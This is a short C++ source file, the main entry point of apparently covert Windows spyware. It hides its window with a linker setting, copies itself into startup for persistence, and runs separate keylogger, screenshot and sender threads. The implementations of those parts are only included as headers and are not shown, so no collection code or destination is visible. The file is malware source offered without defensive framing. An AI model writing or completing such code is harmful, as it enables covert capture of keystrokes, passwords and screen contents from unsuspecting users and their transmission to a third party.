// MDK.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "CopyStartup.h"
#include "keylogger.h"
#include "Screenshot.h"
#include "Sender.h"

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

HANDLE handle[3];

Keylogger keylogger;
Screenshot screenshot;
Sender sender;


int main() {

	copyStartup();

	handle[0] = keylogger.startThread();
	handle[1] = screenshot.startThread();
	handle[2] = sender.startThread();

	WaitForMultipleObjects(3, handle, true, INFINITE);

    return 0;
}

